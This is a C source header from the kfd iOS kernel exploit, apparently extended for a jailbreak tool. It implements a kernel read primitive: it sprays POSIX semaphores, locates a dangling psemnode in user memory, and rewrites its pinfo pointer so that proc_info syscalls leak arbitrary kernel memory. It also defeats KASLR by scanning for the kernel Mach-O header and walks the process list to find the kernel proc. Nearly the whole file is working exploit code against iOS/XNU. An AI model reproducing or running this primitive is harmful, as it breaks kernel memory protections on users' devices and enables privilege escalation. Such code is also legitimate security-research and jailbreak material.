/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

extern u64 gKeKfdKernelProc;
size_t keKfdPfKread(uint64_t kaddr, void *out, size_t size);
int init_kernel(size_t (*kread)(uint64_t, void *, size_t), uint64_t kernel_base, const char *filename);
void term_kernel(void);
uint64_t find_proc_object_size(void);

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    if (fd <= 0) {
        // fd table is exhausted on retry passes; leave the slot invalid so the
        // krkw loop keeps going instead of killing the process
        i32* fds = (i32*)(kfd->kread.krkw_method_data);
        fds[id] = -1;
        return;
    }

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > PAC_MASK) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));

            const u64 shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

// T1SZ_BOOT for un-signing kernel pointers (Serotonin rule):
// A16/M1/M2 use 17, everything else 25.
static u64 ke_sem_t1sz_cache = 0;

static u64 ke_sem_t1sz(void)
{
    if (ke_sem_t1sz_cache) return ke_sem_t1sz_cache;
    char ver[512] = {};
    usize size = sizeof(ver);
    if (sysctlbyname("kern.version", ver, &size, NULL, 0) == 0 &&
        (strstr(ver, "T8120") != NULL || strstr(ver, "T8103") != NULL || strstr(ver, "T8112") != NULL)) {
        ke_sem_t1sz_cache = 17;
    } else {
        ke_sem_t1sz_cache = 25;
    }
    return ke_sem_t1sz_cache;
}

static u64 ke_sem_unsign(u64 p)
{
    if (!(p & (1ULL << 55))) return p;
    return p | ~((1ULL << (64 - ke_sem_t1sz())) - 1ULL);
}

// On-device patchfinder shim (implemented in ke_backend_kfd.m, which owns g_kfd).
extern size_t keKfdPfKread(uint64_t kaddr, void *out, size_t size);

// Serotonin rule: derive proc__object_size at runtime with the on-device
// patchfinder. The struct proc layout of iOS 16/17 is stable apart from the
// proc allocation size (task = proc + object_size, pid at +0x60).

void kread_sem_open_find_proc(struct kfd* kfd)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 pseminfo_kaddr = pnode->pinfo;
    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);

    if (!dynamic_system_info.proc__object_size) {
        // Step 1: break KASLR by walking task->vm_map->pmap->tte and scanning
        // backwards for the kernel Mach-O header (Serotonin rule).
        u64 vm_map = 0;
        kread((u64)kfd, task_kaddr + 0x28, &vm_map, sizeof(vm_map));
        vm_map = ke_sem_unsign(vm_map);
        if (!vm_map || !(vm_map >> 40)) return;

        u64 pmap = 0;
        kread((u64)kfd, vm_map + 0x40, &pmap, sizeof(pmap));
        pmap = ke_sem_unsign(pmap);
        if (!pmap || !(pmap >> 40)) return;

        u64 tte_page = 0;
        kread((u64)kfd, pmap, &tte_page, sizeof(tte_page));
        tte_page = ke_sem_unsign(tte_page) & ~0xfffull;
        if (!tte_page || !(tte_page >> 40)) return;

        u64 kbase = 0;
        for (u64 i = 0; i < 0x8000; i++) {
            u64 val = 0;
            kread((u64)kfd, tte_page, &val, sizeof(val));
            if (val == 0x100000cfeedfacf) {
                u64 flags = 0;
                kread((u64)kfd, tte_page + 0x18, &flags, sizeof(flags));
                if (flags == 0 || flags == 0x200001) {
                    kbase = tte_page;
                    break;
                }
            }
            tte_page -= 0x1000;
        }
        if (!kbase) return;

        // Step 2: on-device patchfinder for proc__object_size.
        if (init_kernel(keKfdPfKread, kbase, NULL) != 0) return;
        u64 objectSize = find_proc_object_size();
        term_kernel();
        if (!objectSize || objectSize < 0x180 || objectSize > 0x1000) return;

        dynamic_system_info.proc__object_size = objectSize;
        dynamic_system_info.proc__p_pid = 0x60;
        dynamic_system_info.proc__p_list__le_next = 0x0;
        dynamic_system_info.proc__p_list__le_prev = 0x8;
        dynamic_system_info.proc__p_fd__fd_ofiles = 0xf8;
        dynamic_system_info.proc__task = 0x0;
        dynamic_system_info.task__map = 0x28;
    }

    // Step 3: the semaphore owner task sits right after its proc; walk the
    // proc list backwards until we find our own pid, then keep going to
    // pid 0 (head of allproc) for the forward-walk discovery in ke_proc.c.
    u64 proc = task_kaddr - dynamic_system_info.proc__object_size;
    if (!(proc & 0xFFFF000000000000ULL)) return;
    kfd->info.kaddr.current_proc = proc;

    for (int i = 0; i < 16384; i++) {
        i32 pid = (i32)dynamic_kget(proc__p_pid, proc);
        if (pid == (i32)kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc;
        }
        if (pid == 0) {
            gKeKfdKernelProc = proc;
            break;
        }
        u64 prev = ke_sem_unsign(dynamic_kget(proc__p_list__le_prev, proc));
        if (!prev || !(prev & 0xFFFF000000000000ULL)) break;
        proc = prev;
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */
